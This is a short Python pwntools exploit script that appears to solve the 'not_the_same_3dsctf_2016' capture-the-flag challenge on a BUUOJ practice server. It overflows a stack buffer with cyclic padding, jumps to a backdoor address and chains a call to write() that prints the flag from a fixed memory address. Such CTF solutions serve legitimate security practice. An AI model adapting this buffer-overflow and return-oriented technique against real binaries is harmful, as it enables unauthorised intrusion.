from pwn import *


# p = process("./not_the_same_3dsctf_2016")
p = remote("node4.buuoj.cn", 25053)
pro = ELF("./not_the_same_3dsctf_2016")


write_p = pro.sym["write"]
back_door = 0x080489A0
flag_addr = 0x080ECA2D

pad = cyclic(0x2d)
pad += p32(back_door)+p32(write_p)+p32(0)
pad += p32(1)+p32(flag_addr)+p32(45)
p.sendline(pad)

p.interactive()

